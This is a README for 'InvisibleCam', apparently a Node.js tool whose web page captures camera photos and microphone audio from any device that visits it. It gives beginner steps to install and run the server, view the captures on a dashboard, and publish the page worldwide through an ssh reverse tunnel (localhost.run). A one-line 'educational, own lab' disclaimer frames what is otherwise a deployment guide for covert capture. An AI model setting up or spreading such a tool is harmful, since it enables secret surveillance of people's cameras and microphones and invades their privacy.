# InvisibleCam

<h1 align="center">📷 The Invisible Camera</h1>
<h3 align="center">Test it in your own lab</h3>

---

## ⚠️ DISCLAIMER

**This is ONLY for educational testing in your own lab with consent.**
Do NOT use for illegal purposes. Use at your own risk.

---

## 📋 What You Need (One-Time Setup)

| What | Why | Where to Get It |
|------|-----|-----------------|
| **Node.js** | Runs the server | [nodejs.org](https://nodejs.org) — click the big green button |
| **Git** (optional) | To download the project | [git-scm.com](https://git-scm.com) |

---

## 🚀 Step-by-Step (For Beginners)

### Step 1: Install Node.js

1. Go to **[nodejs.org](https://nodejs.org)**
2. Click the big green **"LTS"** button to download
3. Open the downloaded file and click **Next → Next → Install → Finish**
4. To check it worked: press `Windows key`, type `cmd`, hit Enter, then type:
   ```
   node --version
   ```
   You should see something like `v22.x.x`

---

### Step 2: Download the Project

**Option A — With Git (recommended):**
1. Press `Windows key`, type `cmd`, hit Enter
2. Type:
   ```
   cd Desktop
   git clone https://github.com/NuhuTahiru8/InvisibleCam.git
   ```

**Option B — Without Git:**
1. Go to [github.com/NuhuTahiru8/InvisibleCam](https://github.com/NuhuTahiru8/InvisibleCam)
2. Click the green **"Code"** button → **"Download ZIP"**
3. Extract the ZIP to your Desktop

---

### Step 3: Install Dependencies

1. Open Command Prompt (`Windows key` → type `cmd` → Enter)
2. Type:
   ```
   cd Desktop/InvisibleCam
   npm install
   ```
3. Wait for it to finish (about 30 seconds)

---

### Step 4: Start the Server

```
node server.js
```

You should see a red **INVISIBLE CAM** banner in the terminal.

---

### Step 5: Access the Pages

| Page | Address | What It Does |
|------|---------|-------------|
| **Capture Page** | `http://localhost:3000` | Opens camera & mic on any phone/computer that visits |
| **Dashboard** | `http://localhost:3000/dashboard.html` | View all captured photos & audio |

---

### Step 6: Share with Devices on Your Network

1. Find your computer's IP address:
   - Press `Windows key` → type `cmd` → Enter
   - Type `ipconfig` → look for **IPv4 Address** (e.g., `192.168.1.5`)
2. On another device (phone, laptop) connected to the same WiFi, open:
   ```
   http://YOUR-IP:3000
   ```
   Replace `YOUR-IP` with your actual IP

---

### Step 7: Access from the Internet (Optional)

To make it accessible worldwide, use **localhost.run**:

```
ssh -R 80:localhost:3000 nokey@localhost.run
```

This gives you a public URL like `https://xxxx.lhr.life`

---

## 📁 Project Files

```
InvisibleCam/
├── server.js          ← The server (run this)
├── package.json       ← Project info
├── index.html         ← Camera capture page
├── dashboard.html     ← View captures
└── README.md          ← This guide
```

---

## 🛑 How to Stop

In the terminal, press `Ctrl + C`

---

## 📱 Supported Devices

| Device | Camera | Microphone |
|--------|--------|------------|
| Android | ✅ | ✅ |
| iPhone/iPad | ✅ | ✅ |
| Windows PC | ✅ | ✅ |
| Mac | ✅ | ✅ |
| Linux | ✅ | ✅ |

---

<div align="center">

Copyright © 2023 - **Tahiru0nSecurity**
By Nuhu Tahiru
Made with 🧠, ⌨ & 🖱

</div>
